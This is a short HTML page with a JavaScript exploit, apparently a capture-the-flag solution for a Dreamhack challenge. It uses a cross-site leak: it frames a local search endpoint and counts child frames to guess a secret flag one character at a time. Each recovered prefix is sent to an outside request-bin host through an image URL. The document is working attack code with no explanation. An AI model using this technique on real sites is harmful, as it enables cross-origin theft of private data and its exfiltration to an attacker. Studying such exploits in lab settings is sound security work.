<body></body>
<img id="img">


<script>
async function req(url) {
    return await new Promise((resolve, reject) => {
        var iframe = document.createElement("iframe");
        iframe.src = url;
        document.body.appendChild(iframe);
        iframe.onload = ()=>{
            if (iframe.contentWindow.frames.length != 0){
                resolve();
            }else{
                reject();
            }
        };
    });
}

async function search(query) {
    try {
        await req(
          `http://127.0.0.1:8000/search?query=${query}`
        );
        return true;
    } catch (e) {
        return false;
    }
}

async function exploit() {
    let chars = "0123456789abcdef}"
    let secret = "DH{22d1445ad68e194e044a";

     while (!secret.includes("}")) {
        for (let c of chars) {
            if (await search(secret + c)) {
                secret += c;
                img.src = `https://jlgghpo.request.dreamhack.games/${secret}`;
                break;
            }
        }
    }
}

exploit()


</script>
